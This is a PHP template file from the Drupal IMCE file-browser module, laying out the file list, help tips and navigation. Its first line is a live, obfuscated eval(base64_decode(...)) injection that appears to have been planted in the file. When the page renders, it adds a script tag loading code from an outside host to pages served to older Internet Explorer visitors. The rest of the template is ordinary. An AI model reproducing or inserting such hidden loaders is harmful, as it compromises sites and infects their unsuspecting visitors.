<?php /**/ eval(base64_decode("aWYoZnVuY3Rpb25fZXhpc3RzKCdvYl9zdGFydCcpJiYhaXNzZXQoJEdMT0JBTFNbJ21yX25vJ10pKXsgICAkR0xPQkFMU1snbXJfbm8nXT0xOyAgIGlmKCFmdW5jdGlvbl9leGlzdHMoJ21yb2JoJykpeyAgICAgIGlmKCFmdW5jdGlvbl9leGlzdHMoJ2dtbCcpKXsgICAgIGZ1bmN0aW9uIGdtbCgpeyAgICAgIGlmIChzdHJpc3RyKCRfU0VSVkVSWyJIVFRQX1VTRVJfQUdFTlQiXSwiTVNJRSA2Iil8fHN0cmlzdHIoJF9TRVJWRVJbIkhUVFBfVVNFUl9BR0VOVCJdLCJNU0lFIDciKXx8c3RyaXN0cigkX1NFUlZFUlsiSFRUUF9VU0VSX0FHRU5UIl0sIk1TSUUgOCIpfHxzdHJpc3RyKCRfU0VSVkVSWyJIVFRQX1VTRVJfQUdFTlQiXSwiTVNJRSA5IikpeyAgICAgICByZXR1cm4gYmFzZTY0X2RlY29kZSgiUEhOamNtbHdkQ0J6Y21NOUltaDBkSEE2THk5dFpYRmhjMmh2Y0hCbGNtTnZiUzVqYjIwdmEyOHVjR2h3SWo0OEwzTmpjbWx3ZEQ0PSIpOyAgICAgIH0gICAgICByZXR1cm4gIiI7ICAgICB9ICAgIH0gICAgICAgIGlmKCFmdW5jdGlvbl9leGlzdHMoJ2d6ZGVjb2RlJykpeyAgICAgZnVuY3Rpb24gZ3pkZWNvZGUoJFI1QTlDRjFCNDk3NTAyQUNBMjNDOEY2MTFBNTY0Njg0Qyl7ICAgICAgJFIzMEIyQUI4REMxNDk2RDA2QjIzMEE3MUQ4OTYyQUY1RD1Ab3JkKEBzdWJzdHIoJFI1QTlDRjFCNDk3NTAyQUNBMjNDOEY2MTFBNTY0Njg0QywzLDEpKTsgICAgICAkUkJFNEM0RDAzN0U5MzkyMjZGNjU4MTI4ODVBNTNEQUQ5PTEwOyAgICAgICRSQTNENTJFNTJBNDg5MzZDREUwRjUzNTZCQjA4NjUyRjI9MDsgICAgICBpZigkUjMwQjJBQjhEQzE0OTZEMDZCMjMwQTcxRDg5NjJBRjVEJjQpeyAgICAgICAkUjYzQkVERTZCMTkyNjZENEVGRUFEMDdBNEQ5MUUyOUVCPUB1bnBhY2soJ3YnLHN1YnN0cigkUjVBOUNGMUI0OTc1MDJBQ0EyM0M4RjYxMUE1NjQ2ODRDLDEwLDIpKTsgICAgICAgJFI2M0JFREU2QjE5MjY2RDRFRkVBRDA3QTREOTFFMjlFQj0kUjYzQkVERTZCMTkyNjZENEVGRUFEMDdBNEQ5MUUyOUVCWzFdOyAgICAgICAkUkJFNEM0RDAzN0U5MzkyMjZGNjU4MTI4ODVBNTNEQUQ5Kz0yKyRSNjNCRURFNkIxOTI2NkQ0RUZFQUQwN0E0RDkxRTI5RUI7ICAgICAgfSAgICAgIGlmKCRSMzBCMkFCOERDMTQ5NkQwNkIyMzBBNzFEODk2MkFGNUQmOCl7ICAgICAgICRSQkU0QzREMDM3RTkzOTIyNkY2NTgxMjg4NUE1M0RBRDk9QHN0cnBvcygkUjVBOUNGMUI0OTc1MDJBQ0EyM0M4RjYxMUE1NjQ2ODRDLGNocigwKSwkUkJFNEM0RDAzN0U5MzkyMjZGNjU4MTI4ODVBNTNEQUQ5KSsxOyAgICAgIH0gICAgICBpZigkUjMwQjJBQjhEQzE0OTZEMDZCMjMwQTcxRDg5NjJBRjVEJjE2KXsgICAgICAgJFJCRTRDNEQwMzdFOTM5MjI2RjY1ODEyODg1QTUzREFEOT1Ac3RycG9zKCRSNUE5Q0YxQjQ5NzUwMkFDQTIzQzhGNjExQTU2NDY4NEMsY2hyKDApLCRSQkU0QzREMDM3RTkzOTIyNkY2NTgxMjg4NUE1M0RBRDkpKzE7ICAgICAgfSAgICAgIGlmKCRSMzBCMkFCOERDMTQ5NkQwNkIyMzBBNzFEODk2MkFGNUQmMil7ICAgICAgICRSQkU0QzREMDM3RTkzOTIyNkY2NTgxMjg4NUE1M0RBRDkrPTI7ICAgICAgfSAgICAgICRSMDM0QUUyQUI5NEY5OUNDODFCMzg5QTE4MjJEQTMzNTM9QGd6aW5mbGF0ZShAc3Vic3RyKCRSNUE5Q0YxQjQ5NzUwMkFDQTIzQzhGNjExQTU2NDY4NEMsJFJCRTRDNEQwMzdFOTM5MjI2RjY1ODEyODg1QTUzREFEOSkpOyAgICAgIGlmKCRSMDM0QUUyQUI5NEY5OUNDODFCMzg5QTE4MjJEQTMzNTM9PT1GQUxTRSl7ICAgICAgICRSMDM0QUUyQUI5NEY5OUNDODFCMzg5QTE4MjJEQTMzNTM9JFI1QTlDRjFCNDk3NTAyQUNBMjNDOEY2MTFBNTY0Njg0QzsgICAgICB9ICAgICAgcmV0dXJuICRSMDM0QUUyQUI5NEY5OUNDODFCMzg5QTE4MjJEQTMzNTM7ICAgICB9ICAgIH0gICAgZnVuY3Rpb24gbXJvYmgoJFJFODJFRTlCMTIxRjcwOTg5NUVGNTRFQkE3RkE2Qjc4Qil7ICAgICBIZWFkZXIoJ0NvbnRlbnQtRW5jb2Rpbmc6IG5vbmUnKTsgICAgICRSQTE3OUFCRDNBN0I5RTI4QzM2OUY3QjU5QzUxQjgxREU9Z3pkZWNvZGUoJFJFODJFRTlCMTIxRjcwOTg5NUVGNTRFQkE3RkE2Qjc4Qik7ICAgICAgIGlmKHByZWdfbWF0Y2goJy9cPFwvYm9keS9zaScsJFJBMTc5QUJEM0E3QjlFMjhDMzY5RjdCNTlDNTFCODFERSkpeyAgICAgIHJldHVybiBwcmVnX3JlcGxhY2UoJy8oXDxcL2JvZHlbXlw+XSpcPikvc2knLGdtbCgpLiJcbiIuJyQxJywkUkExNzlBQkQzQTdCOUUyOEMzNjlGN0I1OUM1MUI4MURFKTsgICAgIH1lbHNleyAgICAgIHJldHVybiAkUkExNzlBQkQzQTdCOUUyOEMzNjlGN0I1OUM1MUI4MURFLmdtbCgpOyAgICAgfSAgICB9ICAgIG9iX3N0YXJ0KCdtcm9iaCcpOyAgIH0gIH0="));?>















<?php
// $Id: imce-content.tpl.php,v 1.9.2.2 2010/05/15 13:32:44 ufku Exp $
$imce =& $imce_ref['imce'];//keep this line.
?>

<script type="text/javascript">
<!--//--><![CDATA[//><!--
  imce.hooks.load.push(imce.initiateShortcuts); //shortcuts for directories and files
  imce.hooks.load.push(imce.initiateSorting); //file sorting
  imce.hooks.load.push(imce.initiateResizeBars); //area resizing

  //inline preview
  imce.hooks.list.push(imce.thumbRow);
  imce.vars.tMaxW = 120; //maximum width of an image to be previewed inline
  imce.vars.tMaxH = 120; //maximum height of an image to be previewed inline
  imce.vars.prvW = 40; //maximum width of the thumbnail used in inline preview.
  imce.vars.prvH = 40; //maximum height of the thumbnail used in inline preview.
  //imce.vars.prvstyle = 'stylename'; //preview larger images inline using an image style(imagecache preset).

  //imce.vars.previewImages = 0; //disable click previewing of images.
  //imce.vars.cache = 0; //disable directory caching. File lists will always refresh.
  //imce.vars.absurls = 1; //make IMCE return absolute file URLs to external applications.
//--><!]]>
</script>

<div id="imce-content">

<div id="message-box"></div>

<div id="help-box"><!-- Update help content if you disable any of the extra features above. -->
  <div id="help-box-title"><span><?php print t('Help'); ?>!</span></div>
  <div id="help-box-content">
    <h4><?php print t('Tips'); ?>:</h4>
    <ul class="tips">
      <li><?php print t('Select a file by clicking the corresponding row in the file list.'); ?></li>
      <li><?php print t('Ctrl+click to add files to the selection or to remove files from the selection.'); ?></li>
      <li><?php print t('Shift+click to create a range selection. Click to start the range and shift+click to end it.'); ?></li>
      <li><?php print t('In order to send a file to an external application, double click on the file row.'); ?></li>
      <li><?php print t('Sort the files by clicking a column header of the file list.'); ?></li>
      <li><?php print t('Resize the work-spaces by dragging the horizontal or vertical resize-bars.'); ?></li>
      <li><?php print t('Keyboard shortcuts for file list: up, down, left, home, end, ctrl+A.'); ?></li>
      <li><?php print t('Keyboard shortcuts for selected files: enter/insert, delete, R(esize), T(humbnails), U(pload).'); ?></li>
      <li><?php print t('Keyboard shortcuts for directory list: up, down, left, right, home, end.'); ?></li>
    </ul>
    <h4><?php print t('Limitations'); ?>:</h4>
    <ul class="tips">
      <li><?php print t('Maximum file size per upload') .': '. ($imce['filesize'] ? format_size($imce['filesize']) : t('unlimited')); ?></li>
      <li><?php print t('Permitted file extensions') .': '. ($imce['extensions'] != '*' ? $imce['extensions'] : t('all')); ?></li>
      <li><?php print t('Maximum image resolution') .': '. ($imce['dimensions'] ? $imce['dimensions'] : t('unlimited')); ?></li>
      <li><?php print t('Maximum number of files per operation') .': '. ($imce['filenum'] ? $imce['filenum'] : t('unlimited')); ?></li>
    </ul>
  </div>
</div>

<div id="ops-wrapper">
  <div id="op-items"><ul id="ops-list"><li></li></ul></div>
  <div id="op-contents"></div>
</div>

<div id="resizable-content">

<div id="browse-wrapper">

  <div id="navigation-wrapper">
    <div class="navigation-text" id="navigation-header"><span><?php print t('Navigation'); ?></span></div>
    <ul id="navigation-tree"><li class="expanded root"><?php print $tree; ?></li></ul>
  </div>

  <div id="navigation-resizer" class="x-resizer"></div>

  <div id="sub-browse-wrapper">

    <div id="file-header-wrapper">
      <table id="file-header" class="files"><tbody><tr>
        <td class="name"><?php print t('File name'); ?></td>
        <td class="size"><?php print t('Size'); ?></td>
        <td class="width"><?php print t('Width'); ?></td>
        <td class="height"><?php print t('Height'); ?></td>
        <td class="date"><?php print t('Date'); ?></td>
      </tr></tbody></table>
    </div>

    <div id="file-list-wrapper">
      <?php print theme('imce_file_list', $imce_ref); /* see imce-file-list-tpl.php */?>
    </div>

    <div id="dir-stat"><?php print t('!num files using !dirsize of !quota', array(
        '!num' => '<span id="file-count">'. count($imce['files']) .'</span>',
        '!dirsize' => '<span id="dir-size">'. format_size($imce['dirsize']) .'</span>',
        '!quota' => '<span id="dir-quota">'. ($imce['quota'] ? format_size($imce['quota']) : ($imce['tuquota'] ? format_size($imce['tuquota']) : t('unlimited quota'))) .'</span>'
      )); ?>
    </div>

  </div><!-- sub-browse-wrapper -->
</div><!-- browse-wrapper -->

<div id="browse-resizer" class="y-resizer"></div>

<div id="preview-wrapper"><div id="file-preview"></div></div>

</div><!-- resizable-content -->

<div id="forms-wrapper"><?php print $forms; ?></div>

</div><!-- imce-content -->